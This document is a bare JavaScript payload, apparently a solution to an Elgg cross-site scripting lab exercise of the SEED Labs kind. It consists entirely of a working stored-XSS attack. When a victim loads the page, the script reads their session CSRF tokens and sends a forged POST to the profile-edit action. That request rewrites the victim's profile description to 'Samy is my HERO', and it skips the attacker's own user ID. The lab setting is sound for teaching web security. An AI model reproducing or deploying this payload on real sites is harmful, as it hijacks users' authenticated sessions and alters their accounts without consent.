<script type="text/javascript">
window.onload = function() {
   
    if(elgg.session.user.guid != 47) {  
        var content = "__elgg_token=" + elgg.security.token.__elgg_token +
                     "&__elgg_ts=" + elgg.security.token.__elgg_ts +
                     "&name=" + elgg.session.user.name +
                     "&description=" + encodeURIComponent("Samy is my HERO (ADDED BY HAN)") +
                     "&accesslevel[description]=2" +
                     "&briefdescription=" + encodeURIComponent("Samy is my HERO (ADDED BY HAN)") +
                     "&accesslevel[briefdescription]=2" +
                     "&guid=" + elgg.session.user.guid;

        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", "http://www.xsslabelgg.com/action/profile/edit", true);
        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
</script>
